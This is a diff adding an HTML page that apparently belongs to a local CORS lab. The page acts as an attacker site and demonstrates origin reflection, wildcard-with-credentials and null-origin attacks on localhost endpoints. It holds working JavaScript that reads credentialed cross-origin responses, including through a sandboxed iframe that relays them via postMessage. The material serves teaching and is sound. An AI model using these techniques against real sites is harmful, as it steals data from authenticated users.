@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker Site (Port 3003)</title>
+  <style>
+    body { font-family: monospace; max-width: 900px; margin: 40px auto; background: #0d1117; color: #c9d1d9; padding: 20px; }
+    h1   { color: #f85149; }
+    h2   { color: #ff7b72; margin-top: 30px; }
+    h3   { color: #ffa657; }
+    .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
+    .attacker { background: #b91c1c; color: #fff; }
+    .vuln-label { background: #7c3aed; color: #fff; }
+    .safe-label { background: #15803d; color: #fff; }
+    button  { background: #b91c1c; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; margin: 4px; font-family: monospace; }
+    button:hover { background: #dc2626; }
+    pre    { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; white-space: pre-wrap; word-break: break-all; min-height: 60px; }
+    .ok    { color: #3fb950; border-color: #238636 !important; }
+    .blocked { color: #f85149; border-color: #b91c1c !important; }
+    .info  { color: #d29922; }
+    .url   { color: #58a6ff; font-size: 12px; }
+    .explain { background: #161b22; border-left: 3px solid #7c3aed; padding: 10px 14px; margin: 10px 0; border-radius: 0 6px 6px 0; font-size: 13px; line-height: 1.6; }
+    table  { width: 100%; border-collapse: collapse; margin: 16px 0; }
+    th,td  { border: 1px solid #30363d; padding: 8px 12px; text-align: left; font-size: 13px; }
+    th     { background: #161b22; color: #79c0ff; }
+    iframe { display: none; }
+  </style>
+</head>
+<body>
+  <h1><span class="badge attacker">ATTACKER SITE</span> — http://localhost:3003</h1>
+  <p>
+    This page simulates a <strong>malicious website</strong> that exploits CORS misconfigurations
+    in the API server at <code>http://localhost:3001</code>.
+    <br>Open your browser's DevTools → Network tab to inspect the actual HTTP headers.
+  </p>
+
+  <!-- ════════════════════════════════════════════════════════════════ -->
+  <h2><span class="badge vuln-label">VULN 1</span> — Origin Reflection</h2>
+  <p class="url">Target: GET http://localhost:3001/api/data-reflect</p>
+  <div class="explain">
+    The server reads the <code>Origin</code> request header and mirrors it back as
+    <code>Access-Control-Allow-Origin</code>. Combined with
+    <code>Access-Control-Allow-Credentials: true</code>, any origin — including this
+    malicious one — can read authenticated responses.
+  </div>
+  <button onclick="attack_reflect()">Run Attack — Steal Data via Origin Reflection</button>
+  <pre id="out-reflect">Click to run the attack...</pre>
+
+  <!-- ════════════════════════════════════════════════════════════════ -->
+  <h2><span class="badge vuln-label">VULN 2</span> — Wildcard + Credentials (Browser Blocks)</h2>
+  <p class="url">Target: GET http://localhost:3001/api/data-wildcard</p>
+  <div class="explain">
+    The server sets <code>Access-Control-Allow-Origin: *</code> together with
+    <code>Access-Control-Allow-Credentials: true</code>.
+    The CORS spec <strong>forbids</strong> this combination — browsers will block the response.
+    This shows that <em>two wrongs don't accidentally make a right</em>; the server still leaks
+    data to unauthenticated (no-cookie) requests, just not credentialed ones.
+  </div>
+  <button onclick="attack_wildcard()">Run Attack — Wildcard + Credentials</button>
+  <pre id="out-wildcard">Click to run the attack...</pre>
+
+  <!-- ════════════════════════════════════════════════════════════════ -->
+  <h2><span class="badge vuln-label">VULN 3</span> — Null Origin (Sandboxed iframe)</h2>
+  <p class="url">Target: GET http://localhost:3001/api/data-null</p>
+  <div class="explain">
+    Some servers whitelist the literal string <code>"null"</code> as an allowed origin.
+    Browsers send <code>Origin: null</code> from sandboxed iframes (<code>sandbox</code>
+    attribute without <code>allow-same-origin</code>).  An attacker can host a page that
+    injects a sandboxed iframe, which then makes the cross-origin request and exfiltrates
+    the response via <code>postMessage</code>.
+  </div>
+  <button onclick="attack_null()">Run Attack — Null Origin via Sandboxed iframe</button>
+  <pre id="out-null">Click to run the attack...</pre>
+  <!-- Hidden sandboxed iframe used for the null-origin attack -->
+  <iframe id="null-frame" sandbox="allow-scripts"></iframe>
+
+  <!-- ════════════════════════════════════════════════════════════════ -->
+  <h2><span class="badge safe-label">SAFE</span> — Secure Endpoint (Should Be Blocked)</h2>
+  <p class="url">Target: GET http://localhost:3001/api/data-secure</p>
+  <div class="explain">
+    This endpoint only allows <code>http://localhost:3002</code>. When this attacker page
+    (at port 3003) tries to read the response, the browser blocks it because the server
+    returns no CORS headers for unauthorized origins.
+  </div>
+  <button onclick="attack_secure()">Attempt Attack — Secure Endpoint</button>
+  <pre id="out-secure">Click to attempt the attack...</pre>
+
+  <!-- ════════════════════════════════════════════════════════════════ -->
+  <h2>HTTP Header Comparison</h2>
+  <table>
+    <tr>
+      <th>Endpoint</th>
+      <th>Access-Control-Allow-Origin</th>
+      <th>Credentials</th>
+      <th>Result for Attacker</th>
+    </tr>
+    <tr>
+      <td>/api/data-reflect</td>
+      <td>Echoes request Origin</td>
+      <td>true</td>
+      <td style="color:#f85149">Data stolen</td>
+    </tr>
+    <tr>
+      <td>/api/data-wildcard</td>
+      <td>*</td>
+      <td>true (invalid)</td>
+      <td style="color:#d29922">Browser blocks (spec violation)</td>
+    </tr>
+    <tr>
+      <td>/api/data-null</td>
+      <td>null</td>
+      <td>true</td>
+      <td style="color:#f85149">Data stolen via iframe</td>
+    </tr>
+    <tr>
+      <td>/api/data-secure</td>
+      <td>http://localhost:3002 only</td>
+      <td>true (only for allowed origin)</td>
+      <td style="color:#3fb950">Blocked</td>
+    </tr>
+  </table>
+
+  <script>
+    // ── Vuln 1: Origin Reflection ──────────────────────────────────
+    async function attack_reflect() {
+      const el = document.getElementById('out-reflect');
+      el.className = 'info';
+      el.textContent = 'Sending cross-origin request with credentials...\n(check Network tab for ACAO header)';
+      try {
+        const res = await fetch('http://localhost:3001/api/data-reflect', {
+          method: 'GET',
+          credentials: 'include',   // sends cookies automatically
+        });
+        const data = await res.json();
+        el.className = 'ok';
+        el.textContent =
+          '[SUCCESS] Attacker stole sensitive data!\n\n' +
+          JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.className = 'blocked';
+        el.textContent = '[BLOCKED] ' + err.message;
+      }
+    }
+
+    // ── Vuln 2: Wildcard + Credentials ────────────────────────────
+    async function attack_wildcard() {
+      const el = document.getElementById('out-wildcard');
+      el.className = 'info';
+      el.textContent = 'Sending request (browser should block due to wildcard + credentials)...';
+      try {
+        const res = await fetch('http://localhost:3001/api/data-wildcard', {
+          credentials: 'include',
+        });
+        const data = await res.json();
+        el.className = 'ok';
+        el.textContent =
+          '[SUCCESS — unexpected!] Got data:\n\n' +
+          JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.className = 'blocked';
+        el.textContent =
+          '[BLOCKED by browser] ' + err.message + '\n\n' +
+          'Expected: browsers refuse wildcard ACAO when credentials:include is set.\n' +
+          'Note: without credentials a wildcard endpoint still leaks unauthenticated data.';
+      }
+    }
+
+    // ── Vuln 3: Null origin via sandboxed iframe ───────────────────
+    function attack_null() {
+      const el = document.getElementById('out-null');
+      el.className = 'info';
+      el.textContent = 'Injecting sandboxed iframe that sends Origin: null ...';
+
+      // Listen for exfiltrated data from the iframe
+      const handler = (event) => {
+        if (event.data && event.data.type === 'cors-null-result') {
+          window.removeEventListener('message', handler);
+          if (event.data.success) {
+            el.className = 'ok';
+            el.textContent =
+              '[SUCCESS] Attacker received data via postMessage from sandboxed iframe!\n\n' +
+              JSON.stringify(event.data.payload, null, 2);
+          } else {
+            el.className = 'blocked';
+            el.textContent = '[BLOCKED] ' + event.data.error;
+          }
+        }
+      };
+      window.addEventListener('message', handler);
+
+      // The sandboxed iframe sends Origin: null because it has no allow-same-origin
+      const iframe = document.getElementById('null-frame');
+      const iframeCode = `
+        <script>
+          fetch('http://localhost:3001/api/data-null', { credentials: 'include' })
+            .then(r => r.json())
+            .then(data => parent.postMessage({ type: 'cors-null-result', success: true, payload: data }, '*'))
+            .catch(err => parent.postMessage({ type: 'cors-null-result', success: false, error: err.message }, '*'));
+        <\/script>
+      `;
+      iframe.srcdoc = iframeCode;
+    }
+
+    // ── Secure endpoint (should fail) ─────────────────────────────
+    async function attack_secure() {
+      const el = document.getElementById('out-secure');
+      el.className = 'info';
+      el.textContent = 'Attempting to read the secure endpoint from this origin...';
+      try {
+        const res = await fetch('http://localhost:3001/api/data-secure', {
+          credentials: 'include',
+        });
+        const data = await res.json();
+        el.className = 'ok';  // Should NOT reach here
+        el.textContent = '[UNEXPECTED SUCCESS]\n\n' + JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.className = 'blocked';
+        el.textContent =
+          '[BLOCKED — as expected]\n\n' +
+          err.message + '\n\n' +
+          'The secure endpoint returned no ACAO header for this origin.\n' +
+          'The browser enforced the same-origin policy correctly.';
+      }
+    }
+  </script>
+</body>
+</html>
